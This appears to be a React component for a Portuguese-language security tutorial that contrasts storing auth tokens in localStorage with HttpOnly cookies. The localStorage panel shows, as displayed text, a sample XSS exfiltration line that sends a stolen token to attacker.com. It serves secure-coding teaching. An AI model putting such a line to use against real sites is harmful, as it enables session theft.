'use client'

import { useState } from 'react'

export function TokenStorageDemo() {
  const [demo, setDemo] = useState<'initial' | 'localStorage' | 'cookies'>('initial')

  return (
    <div className="my-8 space-y-4">
      <div className="rounded-2xl border border-slate-800 bg-slate-900/60 p-6">
        {demo === 'initial' && (
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">localStorage vs HttpOnly Cookies</h3>
            <p className="text-sm text-slate-300">
              Compare os riscos de cada abordagem para armazenar tokens de autenticação.
            </p>
          </div>
        )}

        {demo === 'localStorage' && (
          <div className="space-y-4">
            <div className="rounded-lg bg-red-950/30 border border-red-900 p-4">
              <h4 className="font-semibold text-red-400 mb-3">localStorage (INSEGURO)</h4>
              <pre className="text-xs overflow-x-auto bg-black/50 p-3 rounded mb-3">
{`// Frontend armazena o token
localStorage.setItem('access_token', token)

// Qualquer script pode acessar:
const stolen = localStorage.getItem('access_token')

// Se houver XSS, o token é roubado!
fetch('https://attacker.com?token=' + stolen)`}</pre>
              <div className="bg-black/30 p-3 rounded">
                <p className="text-xs text-slate-300 mb-2">
                  <strong>Simule no DevTools:</strong>
                </p>
                <code className="text-xs text-amber-400">
                  localStorage.getItem('access_token')
                </code>
                <p className="text-xs text-slate-400 mt-2">
                  ↑ Qualquer script na página pode executar isso
                </p>
              </div>
            </div>
            <div className="rounded-lg bg-red-900/20 border border-red-800 p-4">
              <p className="text-sm text-red-300">
                <strong>Problema:</strong> localStorage é acessível via JavaScript. Se houver XSS, 
                o atacante rouba seu token e se autentica como você.
              </p>
            </div>
          </div>
        )}

        {demo === 'cookies' && (
          <div className="space-y-4">
            <div className="rounded-lg bg-emerald-950/30 border border-emerald-900 p-4">
              <h4 className="font-semibold text-emerald-400 mb-3">HttpOnly Cookies (SEGURO)</h4>
              <pre className="text-xs overflow-x-auto bg-black/50 p-3 rounded mb-3">
{`// Backend define o cookie (Node.js/Express)
res.cookie('auth_token', token, {
  httpOnly: true,    // Inacessível ao JavaScript!
  secure: true,      // Apenas HTTPS
  sameSite: 'strict' // Proteção CSRF
})

// Frontend: o cookie é enviado automaticamente
// Não precisa fazer nada!

// Tentativa de acesso via JavaScript:
document.cookie // → "" (vazio, protegido!)
`}</pre>
              <div className="bg-emerald-950/50 p-3 rounded space-y-2">
                <p className="text-xs text-emerald-300">
                  <strong>Benefícios:</strong>
                </p>
                <ul className="text-xs text-slate-300 space-y-1 ml-4">
                  <li><strong>httpOnly:</strong> JavaScript não consegue acessar</li>
                  <li><strong>secure:</strong> Apenas em HTTPS</li>
                  <li><strong>sameSite:</strong> Proteção contra CSRF</li>
                  <li><strong>Automático:</strong> Browser gerencia envio</li>
                </ul>
              </div>
            </div>
            <div className="rounded-lg bg-emerald-900/20 border border-emerald-800 p-4">
              <p className="text-sm text-emerald-300">
                <strong>Solução:</strong> Mesmo com XSS, o atacante não consegue roubar o token.
                O backend gerencia toda a autenticação de forma segura.
              </p>
            </div>
          </div>
        )}
      </div>

      <div className="flex flex-wrap gap-3">
        <button
          onClick={() => setDemo('localStorage')}
          className="inline-flex items-center gap-2 rounded-full bg-rose-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-rose-400 transition-colors"
        >
          localStorage (inseguro)
        </button>
        <button
          onClick={() => setDemo('cookies')}
          className="inline-flex items-center gap-2 rounded-full bg-emerald-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-emerald-400 transition-colors"
        >
          HttpOnly Cookie (seguro)
        </button>
        {demo !== 'initial' && (
          <button
            onClick={() => setDemo('initial')}
            className="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-sm font-semibold text-slate-100 hover:bg-slate-600 transition-colors"
          >
            Resetar
          </button>
        )}
      </div>
    </div>
  )
}
